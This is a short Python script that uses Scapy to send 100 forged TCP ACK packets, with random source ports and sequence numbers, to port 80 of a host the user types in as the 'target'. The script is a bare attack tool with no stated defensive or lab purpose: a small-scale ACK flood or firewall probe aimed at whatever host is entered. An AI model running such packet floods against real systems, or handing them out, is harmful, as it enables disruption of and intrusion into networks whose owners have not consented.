from scapy.all import *
import random

dest = input("Enter target: ")

for i in range(100):
    pkt = IP(dst=dest)/TCP(sport=random.randint(1024,65535), dport=80, flags="A", seq=random.randint(0,4294967295))
    send(pkt, verbose=False)
